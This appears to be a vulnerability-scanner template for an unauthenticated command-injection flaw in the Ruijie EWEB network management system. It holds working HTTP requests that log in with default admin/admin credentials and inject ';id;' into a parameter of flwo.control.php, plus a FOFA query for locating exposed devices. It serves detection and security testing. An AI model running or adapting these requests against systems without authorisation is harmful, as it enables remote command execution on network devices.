id: ruijie-route-control-rce

info:
  name: 锐捷 EWEB 网管系统 flwo.control.php 远程命令执行
  author: avic123
  severity: critical
  description: |
    锐捷 EWEB 网管系统 /flow_control_pi/flwo.control.php 的 type 参数存在命令注入，未授权攻击者可执行任意系统命令。
  reference:
    - https://github.com/gobysec/GobyVuls/blob/master/Ruijie_EWEB_Network_Management_System_flwo.control.php_type_Arbitrary_Command_Execution_Vulnerability.md
    - https://github.com/zan8in/afrog-pocs/blob/main/vulnerability/ruijie-route-control-rce.yaml
  metadata:
    max-request: 2
    fofa-query: title="锐捷网络-EWEB网管系统"
    verified: true
  tags: ruijie,eweb,rce

http:
  - raw:
      - |
        POST /ddi/server/login.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        username=admin&password=admin?

      - |
        POST /flow_control_pi/flwo.control.php?a=getFlowGroup HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        type=;id;

    cookie-reuse: true

    matchers:
      - type: dsl
        dsl:
          - 'status_code_2 == 200 && regex("uid=[0-9]+\\([a-zA-Z0-9._-]+\\)", body_2)'
